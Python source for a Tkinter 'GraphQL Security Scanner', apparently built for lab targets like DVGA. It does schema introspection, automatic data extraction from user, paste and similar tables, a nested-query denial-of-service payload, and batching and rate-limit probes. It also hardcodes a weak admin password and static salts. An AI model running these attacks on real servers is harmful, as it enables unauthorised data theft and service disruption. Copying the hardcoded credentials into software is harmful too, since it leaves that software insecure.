import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox, simpledialog
import requests
import threading
import time
import hashlib
import base64
import json
from cryptography.fernet import Fernet

# Admin password for protection
ADMIN_PASSWORD = "admin123" #change this to a strong password in production!

def hash_password(password):
    """Create secure password hash"""
    return hashlib.pbkdf2_hmac(
        "sha256",
        password.encode(),
        b"admin_salt",
        100000
    )

ADMIN_HASH = hash_password(ADMIN_PASSWORD)

def verify_password(password):
    """Verify admin password"""
    return hash_password(password) == ADMIN_HASH

def derive_encryption_key(password):
    """Create encryption key from password"""
    key = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode(),
        b"log_encryption_salt",
        100000
    )
    return base64.urlsafe_b64encode(key[:32])

class GraphQLEngine:
    """Handle GraphQL server communication"""
    
    def __init__(self):
        self.target_url = ""
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "GraphQL-Scanner/1.0"
        }

    def set_url(self, url):
        """Set target URL"""
        self.target_url = url.strip()

    def _send_request(self, query_payload=None, timeout=20):
        """Send request to server"""
        try:
            json_data = {'query': query_payload} if query_payload else {}
            response = requests.post(
                self.target_url,
                json=json_data,
                headers=self.headers,
                timeout=timeout
            )
            return response
        except:
            return None

    def check_endpoint(self, log):
        """Check if URL is GraphQL endpoint"""
        log("Checking connectivity to server...")
        
        response = self._send_request(query_payload="")
        
        if response is None:
            log("Network error - cannot reach server")
            return False

        is_graphql = False
        if response.status_code == 400 or (response.status_code == 200 and "errors" in response.text):
            is_graphql = True
        
        if response.status_code == 404:
            log("HTTP 404 - Endpoint not found")
            return False
        elif not is_graphql:
            log(f"Warning: Returned code {response.status_code} but not GraphQL")
            return False
        
        log("GraphQL endpoint found and active!")
        return True

    def run_introspection(self, log):
        """Get database schema through introspection"""
        if not self.check_endpoint(log):
            return []

        log("Running introspection to discover tables...")
        
        query = """
        query {
          __schema {
            types {
              name
              kind
            }
          }
        }
        """
        
        response = self._send_request(query)
        
        if response and response.status_code == 200 and "__schema" in response.text:
            log("VULNERABILITY: Introspection is enabled!")
            
            try:
                types = response.json()['data']['__schema']['types']
                tables = [t['name'] for t in types if t['kind'] == 'OBJECT' and not t['name'].startswith('__')]
                
                log(f"Found {len(tables)} database tables:")
                for table in tables:
                    log(f"    • {table}")
                log("-" * 50)
                return tables
            except:
                log("Introspection open but parsing failed")
                return []
        else:
            log("Introspection is locked (good security)")
            return []

    def run_smart_exploit(self, log):
        """Try automatic exploitation of known patterns"""
        log("-" * 50)
        log("Starting smart exploitation...")
        
        tables = self.run_introspection(log)
        
        if not tables:
            log("Cannot exploit without introspection data")
            return

        target_query = None
        target_name = ""
        
        # Check for common vulnerable patterns
        if "Paste" in tables or "PasteObject" in tables:
            log("Detected DVGA (Damn Vulnerable GraphQL App) pattern")
            target_name = "DVGA Pastes"
            target_query = "query { pastes { id title content ipAddr } }"
        
        elif "User" in tables and "Post" in tables:
            log("Detected GraphQLZero pattern")
            target_name = "Public Users"
            target_query = "query { users { data { id name email } } }"
        
        elif "User" in tables:
            log("Detected User table (common target)")
            target_name = "Users"
            target_query = "query { users { id name email } }"
        
        elif "Product" in tables:
            log("Detected Product table (e-commerce)")
            target_name = "Products"
            target_query = "query { products { id name price } }"
        
        elif "Book" in tables:
            log("Detected Book table (library system)")
            target_name = "Books"
            target_query = "query { books { id title author } }"
        
        if target_query:
            log(f"Attempting to extract data from: {target_name}")
            response = self._send_request(target_query)
            
            if response and response.status_code == 200:
                log("SUCCESS: Data extraction successful!")
                
                try:
                    data = response.json()
                    display_text = json.dumps(data, indent=2)[:800]
                    if len(json.dumps(data, indent=2)) > 800:
                        display_text += "\n... (output truncated for display)"
                    log(display_text)
                except:
                    log(response.text[:400] + "\n... (truncated output)")
            else:
                status_code = getattr(response, 'status_code', 'Error')
                log(f"Exploit attempt failed (code: {status_code})")
        else:
            log("No known vulnerable patterns detected")
            log("Manual testing needed with above tables")

    def run_dos_test(self, depth, log):
        """Test for Denial of Service vulnerability"""
        log("-" * 50)
        log(f"Testing DoS with query depth: {depth}")
        
        def build_nested_query(current_depth, max_depth):
            if current_depth >= max_depth: return "name"
            nested = build_nested_query(current_depth + 1, max_depth)
            return f"a:fields{{type{{{nested}}}}} b:fields{{type{{{nested}}}}} c:fields{{type{{{nested}}}}}"

        payload = f"query {{ __schema {{ types {{ {build_nested_query(0, depth)} }} }} }}"
        
        try:
            log("Sending heavy nested query...")
            response = requests.post(self.target_url, json={'query': payload}, headers=self.headers, timeout=20)
            log(f"Server responded: Status {response.status_code}")
        except requests.exceptions.Timeout:
            log("DOS VULNERABLE: Server timeout - possible DoS risk!")
        except Exception as e:
            log(f"Error during DoS test: {str(e)[:50]}")

    def run_batching_attack(self, log, count=25):
        """Test batch query support"""
        log("Testing batch query support...")

        payload = [{"query": "query { __typename }"} for _ in range(count)]
        
        try:
            response = requests.post(self.target_url, json=payload, timeout=15, headers=self.headers)
            if response.status_code == 200:
                log("Batch queries are SUPPORTED (potential risk)")
                log(f"Response size: {len(response.text)} bytes")
                try:
                    data = response.json()
                    if isinstance(data, list):
                        log(f"Received {len(data)} batch responses")
                except:
                    pass
            else:
                log(f"Batch queries REJECTED (status: {response.status_code})")
        except requests.exceptions.Timeout:
            log("Batch test timeout")
        except Exception as e:
            log(f"Batch test error: {str(e)[:50]}")

    def run_rate_limit_test(self, log, total=40):
        """Test for rate limiting"""
        log("Testing server rate limiting...")

        success = 0
        blocked = 0
        errors = 0
        
        for i in range(total):
            response = self._send_request("query { __typename }", timeout=5)
            if response:
                if response.status_code == 200:
                    success += 1
                elif response.status_code == 429:
                    blocked += 1
                    log(f"Rate limited detected at request {i+1}")
                else:
                    errors += 1
            else:
                errors += 1
            time.sleep(0.1)

        log(f"Results: {success} successful, {blocked} blocked, {errors} errors")
        log(f"Success rate: {success}/{total}")

        if success == total:
            log("NO rate limiting detected (potential risk)")
        elif blocked > 0:
            log("Rate limiting IS enabled (good security)")
        else:
            log("Some requests failed - check connection")

class ScannerGUI:
    """Main application interface"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("GraphQL Security Scanner")
        self.root.geometry("900x650")
        self.root.configure(bg="#0b0f1a")
        
        # Make window responsive
        self.root.minsize(850, 550)

        self.engine = GraphQLEngine()
        self.log_buffer = []

        self.setup_ui()

    def setup_ui(self):
        """Create user interface"""
        
        # Main container
        main_frame = tk.Frame(self.root, bg="#0b0f1a")
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Title - CLEAR BUT NOT TOO LARGE
        title = tk.Label(
            main_frame,
            text="GraphQL Security Scanner",
            bg="#0b0f1a",
            fg="#9d7cff",
            font=("Arial", 16, "bold")
        )
        title.pack(pady=(0, 10))

        # Target URL section
        url_frame = tk.Frame(main_frame, bg="#0b0f1a")
        url_frame.pack(fill="x", pady=(0, 10))

        tk.Label(
            url_frame,
            text="Target URL:",
            bg="#0b0f1a",
            fg="#00eaff",
            font=("Arial", 10, "bold")
        ).pack(side="left", padx=(0, 10))

        self.url_entry = tk.Entry(
            url_frame,
            bg="#1a1f2e",
            fg="white",
            font=("Arial", 10),
            insertbackground="white",
            width=50
        )
        self.url_entry.pack(side="left", fill="x", expand=True, padx=5)
        self.url_entry.insert(0, "http://127.0.0.1:5013/graphql")

        # ALL BUTTONS IN ONE LINE - COMPACT BUT CLEAR
        buttons_frame = tk.Frame(main_frame, bg="#0b0f1a")
        buttons_frame.pack(fill="x", pady=(0, 10))
        
        # Button configurations with shorter names
        button_configs = [
            ("Recon", self.do_recon, "#00eaff"),
            ("Exploit", self.do_exploit, "#ff5cff"),
            ("DoS Test", self.do_dos, "#ff4c4c"),
            ("Batch", self.do_batching, "#ffd966"),
            ("Rate", self.do_rate, "#7dff7a"),
            ("Save", self.save_logs, "#9d7cff"),
            ("Decrypt", self.decrypt_logs, "#6cf2c2"),
            ("Clear", self.clear_logs, "#ff9f43")
        ]

        for text, command, color in button_configs:
            btn = tk.Button(
                buttons_frame,
                text=text,
                command=command,
                bg=color,
                fg="black",
                font=("Arial", 9, "bold"),
                bd=0,
                padx=8,
                pady=6,
                relief="raised",
                width=8
            )
            btn.pack(side="left", expand=True, fill="x", padx=2)
            
            # Add hover effect
            def make_hover(button, original_color):
                def on_enter(e):
                    button.config(bg=self.lighten_color(original_color))
                def on_leave(e):
                    button.config(bg=original_color)
                button.bind("<Enter>", on_enter)
                button.bind("<Leave>", on_leave)
            
            make_hover(btn, color)

        # Output area label
        output_label = tk.Label(
            main_frame,
            text="Scanner Output:",
            bg="#0b0f1a",
            fg="#00eaff",
            font=("Arial", 11, "bold")
        )
        output_label.pack(anchor="w", pady=(0, 5))

        # Log output area
        self.log_area = scrolledtext.ScrolledText(
            main_frame,
            bg="#05070f",
            fg="white",
            font=("Courier New", 9),  # Monospace for better readability
            state="disabled",
            wrap=tk.WORD,
            height=15
        )
        self.log_area.pack(fill="both", expand=True, pady=(0, 8))

        # Configure text colors
        self.log_area.tag_config("good", foreground="#00ff00")
        self.log_area.tag_config("bad", foreground="#ff4444")
        self.log_area.tag_config("warn", foreground="#ffff00")
        self.log_area.tag_config("info", foreground="#00eaff")
        self.log_area.tag_config("vulnerable", foreground="#ff00ff", font=("Courier New", 9, "bold"))

        # Status bar
        status_frame = tk.Frame(main_frame, bg="#12172a", height=25)
        status_frame.pack(fill="x")
        status_frame.pack_propagate(False)

        self.status_label = tk.Label(
            status_frame,
            text="Ready to scan",
            bg="#12172a",
            fg="#7dff7a",
            font=("Arial", 9)
        )
        self.status_label.pack(side="left", padx=10)

        self.log_count = tk.Label(
            status_frame,
            text="Logs: 0",
            bg="#12172a",
            fg="#00eaff",
            font=("Arial", 9)
        )
        self.log_count.pack(side="right", padx=10)

    def lighten_color(self, color):
        """Lighten a color for hover effect"""
        if color.startswith("#"):
            r = int(color[1:3], 16)
            g = int(color[3:5], 16)
            b = int(color[5:7], 16)
            r = min(255, r + 30)
            g = min(255, g + 30)
            b = min(255, b + 30)
            return f"#{r:02x}{g:02x}{b:02x}"
        return color

    def log(self, message):
        """Add message to log with clear formatting"""
        self.log_buffer.append(message)
        self.log_count.config(text=f"Logs: {len(self.log_buffer)}")

        def update_display():
            self.log_area.config(state="normal")
            
            # Determine message type
            message_lower = message.lower()
            if any(word in message_lower for word in ["success", "found", "supported", "enabled", "active"]):
                tag = "good"
            elif any(word in message_lower for word in ["error", "failed", "rejected", "locked", "cannot"]):
                tag = "bad"
            elif any(word in message_lower for word in ["warning", "limit", "timeout", "risk"]):
                tag = "warn"
            elif "vulnerability" in message_lower or "vulnerable" in message_lower:
                tag = "vulnerable"
            else:
                tag = "info"

            self.log_area.insert(tk.END, message + "\n", tag)
            self.log_area.see(tk.END)
            self.log_area.config(state="disabled")

        self.root.after(0, update_display)

    def do_recon(self):
        """Run reconnaissance scan"""
        self.engine.set_url(self.url_entry.get())
        self.status_label.config(text="Running reconnaissance...")
        threading.Thread(target=self.engine.run_introspection, args=(self.log,), daemon=True).start()
        self.root.after(100, lambda: self.status_label.config(text="Ready"))

    def do_exploit(self):
        """Run exploitation attempt"""
        self.engine.set_url(self.url_entry.get())
        self.status_label.config(text="Running exploitation...")
        threading.Thread(target=self.engine.run_smart_exploit, args=(self.log,), daemon=True).start()
        self.root.after(100, lambda: self.status_label.config(text="Ready"))

    def do_dos(self):
        """Run DoS vulnerability test"""
        self.engine.set_url(self.url_entry.get())
        self.status_label.config(text="Testing DoS vulnerability...")
        threading.Thread(target=self.engine.run_dos_test, args=(8, self.log), daemon=True).start()
        self.root.after(100, lambda: self.status_label.config(text="Ready"))

    def do_batching(self):
        """Run batch query test"""
        self.engine.set_url(self.url_entry.get())
        self.status_label.config(text="Testing batch queries...")
        threading.Thread(target=self.engine.run_batching_attack, args=(self.log,), daemon=True).start()
        self.root.after(100, lambda: self.status_label.config(text="Ready"))

    def do_rate(self):
        """Run rate limiting test"""
        self.engine.set_url(self.url_entry.get())
        self.status_label.config(text="Testing rate limits...")
        threading.Thread(target=self.engine.run_rate_limit_test, args=(self.log,), daemon=True).start()
        self.root.after(100, lambda: self.status_label.config(text="Ready"))

    def save_logs(self):
        """Save logs with encryption"""
        if not self.log_buffer:
            messagebox.showinfo("Information", "No logs to save")
            return

        password = simpledialog.askstring("Admin Password", "Enter password:", show="*")
        if not password or not verify_password(password):
            messagebox.showerror("Error", "Incorrect password")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".elog",
            filetypes=[("Encrypted Logs", "*.elog")]
        )
        if not file_path:
            return

        try:
            key = derive_encryption_key(password)
            fernet = Fernet(key)
            encrypted = fernet.encrypt("\n".join(self.log_buffer).encode())
            
            with open(file_path, "wb") as file:
                file.write(encrypted)

            messagebox.showinfo("Success", "Logs saved successfully")
        except Exception as error:
            messagebox.showerror("Error", f"Failed to save: {str(error)}")

    def decrypt_logs(self):
        """Decrypt saved log files"""
        file_path = filedialog.askopenfilename(
            filetypes=[("Encrypted Logs", "*.elog")]
        )
        if not file_path:
            return

        password = simpledialog.askstring("Password", "Enter password:", show="*")
        if not password:
            return

        try:
            key = derive_encryption_key(password)
            fernet = Fernet(key)

            with open(file_path, "rb") as file:
                decrypted = fernet.decrypt(file.read()).decode()

            save_path = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text Files", "*.txt")]
            )
            if not save_path:
                return

            with open(save_path, "w", encoding="utf-8") as file:
                file.write(decrypted)

            messagebox.showinfo("Success", "Logs decrypted successfully")
        except Exception as error:
            messagebox.showerror("Error", f"Decryption failed: {str(error)}")

    def clear_logs(self):
        """Clear all logs with password protection"""
        password = simpledialog.askstring("Clear Logs", "Enter admin password:", show="*")
        if not password or not verify_password(password):
            messagebox.showerror("Error", "Incorrect password")
            return

        self.log_buffer.clear()
        self.log_area.config(state="normal")
        self.log_area.delete("1.0", tk.END)
        self.log_area.config(state="disabled")
        self.log_count.config(text="Logs: 0")
        self.log("All logs cleared")

if __name__ == "__main__":
    root = tk.Tk()
    app = ScannerGUI(root)
    root.mainloop()